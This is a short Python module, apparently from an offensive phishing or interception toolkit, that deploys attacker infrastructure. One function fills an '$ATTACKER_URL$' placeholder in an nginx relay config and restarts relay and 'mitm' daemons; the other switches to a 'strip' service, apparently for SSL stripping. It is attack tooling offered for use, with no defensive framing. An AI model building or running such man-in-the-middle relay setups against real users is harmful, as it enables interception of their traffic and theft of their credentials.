import os
from ..config import PROJ_ROOT, CONF_PATH, RELAY_CACHE
from ..daemons import NginxMgr, DaemonMgr
from ..utils import errors as errors

def build_relay(subdomain):
    try:
        config = open(CONF_PATH+"relay", 'r').read()
    except FileNotFoundError:
        errors.noFile(CONF_PATH+"relay")
        exit()
    config = config.replace("$ATTACKER_URL$", subdomain)
    nginx = NginxMgr()
    nginx.add_site("relay", config)
    nginx.restart()
    DaemonMgr("strip").stop()
    relay_service = DaemonMgr("relay")
    relay_socket = DaemonMgr("relay.socket")
    mitm_service = DaemonMgr("mitm")
    relay_socket.restart()
    relay_service.restart()
    mitm_service.restart()
    return nginx.isRunning() and relay_socket.isRunning() and mitm_service.isRunning()

def build_strip_relay():
    DaemonMgr("relay").stop()
    DaemonMgr("relay.socket").stop()
    strip_service = DaemonMgr("strip")
    strip_service.restart()
    return strip_service.isRunning()